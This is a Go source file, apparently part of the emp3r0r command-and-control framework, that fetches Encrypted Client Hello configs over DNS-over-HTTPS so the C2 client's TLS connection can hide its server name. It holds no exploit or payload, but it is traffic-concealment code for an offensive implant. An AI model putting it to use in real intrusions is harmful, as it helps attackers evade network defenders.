//go:build with_doh && with_ech

package transport

import (
	"bytes"
	"context"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/miekg/dns"
)

// dohHTTPClient is deliberately separate from the C2 client: the ECH config is
// fetched before the C2 TLS handshake and must not go through the C2 transport
// (or its proxy).
var dohHTTPClient = &http.Client{Timeout: 15 * time.Second}

// echConfigList returns a usable ECHConfigList. ok is false when ECH is not
// configured. When ECH is configured but the fetch fails and no cached copy
// exists, it returns ok=true with the error so the caller can decide whether to
// connect without ECH.
func echConfigList(ctx context.Context) (list []byte, ok bool, err error) {
	ech.mu.Lock()
	if ech.serverName == "" {
		ech.mu.Unlock()
		return nil, false, nil
	}
	dohURL := ech.dohURL
	serverName := ech.serverName
	if ech.freshLocked() {
		list = append([]byte(nil), ech.configList...)
		ech.mu.Unlock()
		return list, true, nil
	}
	stale := append([]byte(nil), ech.configList...)
	ech.mu.Unlock()

	fetched, ttl, err := fetchECHConfigList(ctx, dohURL, serverName)
	if err != nil {
		if len(stale) > 0 {
			logging.Warningf("ECH config refresh for %s failed (%v); using the cached list", serverName, err)
			return stale, true, nil
		}
		return nil, true, err
	}
	ech.mu.Lock()
	ech.configList = append([]byte(nil), fetched...)
	ech.ttl = ttl
	ech.fetchedAt = time.Now()
	ech.mu.Unlock()
	return fetched, true, nil
}

// fetchECHConfigList queries the HTTPS RR for serverName over DoH and returns
// the ECHConfigList together with its DNS TTL. Adapted from sing-box's ECH
// client.
func fetchECHConfigList(ctx context.Context, dohURL, serverName string) ([]byte, time.Duration, error) {
	if dohURL == "" {
		return nil, 0, fmt.Errorf("ECH requires a DoH resolver (--doh) to fetch the HTTPS RR")
	}
	query := new(dns.Msg)
	query.SetQuestion(dns.Fqdn(serverName), dns.TypeHTTPS)
	packed, err := query.Pack()
	if err != nil {
		return nil, 0, fmt.Errorf("pack HTTPS query: %w", err)
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, dohURL, bytes.NewReader(packed))
	if err != nil {
		return nil, 0, err
	}
	req.Header.Set("Content-Type", "application/dns-message")
	req.Header.Set("Accept", "application/dns-message")
	resp, err := dohHTTPClient.Do(req)
	if err != nil {
		return nil, 0, fmt.Errorf("fetch ECH config list: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil, 0, fmt.Errorf("fetch ECH config list: DoH status %s", resp.Status)
	}
	body, err := io.ReadAll(io.LimitReader(resp.Body, 1<<16))
	if err != nil {
		return nil, 0, fmt.Errorf("read DoH response: %w", err)
	}

	var answer dns.Msg
	if err := answer.Unpack(body); err != nil {
		return nil, 0, fmt.Errorf("unpack DoH response: %w", err)
	}
	if answer.Rcode != dns.RcodeSuccess {
		return nil, 0, fmt.Errorf("fetch ECH config list: %s", dns.RcodeToString[answer.Rcode])
	}
	for _, rr := range answer.Answer {
		httpsRR, isHTTPS := rr.(*dns.HTTPS)
		if !isHTTPS {
			continue
		}
		for _, value := range httpsRR.Value {
			if value.Key().String() != "ech" {
				continue
			}
			list, err := base64.StdEncoding.DecodeString(value.String())
			if err != nil {
				return nil, 0, fmt.Errorf("decode ECH config: %w", err)
			}
			ttl := time.Duration(httpsRR.Header().Ttl) * time.Second
			logging.Infof("Fetched ECH config for %s (%d bytes, ttl %s)", serverName, len(list), ttl)
			return list, ttl, nil
		}
	}
	return nil, 0, fmt.Errorf("no ECH config found in the HTTPS RR for %s", serverName)
}
